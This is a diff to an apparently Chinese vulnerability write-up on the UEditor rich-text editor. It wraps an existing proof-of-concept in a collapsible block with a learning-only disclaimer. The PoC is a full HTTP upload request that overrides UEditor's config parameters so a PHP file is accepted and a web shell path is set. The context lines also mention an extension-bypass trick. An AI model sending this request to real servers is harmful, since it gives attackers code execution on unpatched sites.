@@ -72,8 +72,10 @@ http://xxxx/1.gif?.aspx
 
 poc：
 
-```
-POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/fuck&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=fuck HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&amp;CONFIG[imagePathFormat]=ueditor/php/upload/fuck&amp;CONFIG[imageMaxSize]=9999999&amp;CONFIG[imageAllowFiles][]=.php&amp;CONFIG[imageFieldName]=fuck HTTP/1.1
 Host: localhost
 Connection: keep-alive
 Content-Length: 222
@@ -88,14 +90,15 @@ Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
 ———WebKitFormBoundaryDMmqvK6b3ncX4xxA
 Content-Disposition: form-data; name="fuck"; filename="fuck.php"
 Content-Type: application/octet-stream
-<?php 
+&lt;?php 
 phpinfo();
-?>
+?&gt;
 ———WebKitFormBoundaryDMmqvK6b3ncX4xxA—
 
 shell路径由CONFIG[imagePathFormat]=ueditor/php/upload/fuck决定
-http://localhost/ueditor/php/upload/fuck.php
-```
+http://localhost/ueditor/php/upload/fuck.php</code></pre>
+
+</details>
 
 ### 0x03 存储型xss
 
